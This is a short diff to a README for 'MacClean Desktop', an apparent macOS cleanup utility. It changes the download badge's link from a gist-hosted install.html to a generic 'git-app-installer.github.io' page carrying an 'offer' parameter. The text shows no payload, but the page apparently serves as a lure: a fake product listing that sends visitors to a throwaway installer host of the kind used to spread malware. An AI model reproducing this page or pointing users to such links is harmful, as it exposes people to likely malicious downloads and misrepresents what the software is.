@@ -1,7 +1,7 @@
 # MacClean Desktop — performance cleanup for macOS
 MacClean for macOS delivers optimization features to remove junk files, manage system data, and enhance device performance.
 
-<a href="https://gistcdn.githack.com/hotchocolate77-cell/7d7eb7624bb75146d875633c1ac7928e/raw/bd9fc346e6741b3b2d5ce037a14d8122391c4e7f/install.html?offer=MacClean" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MacClean" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MacClean%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
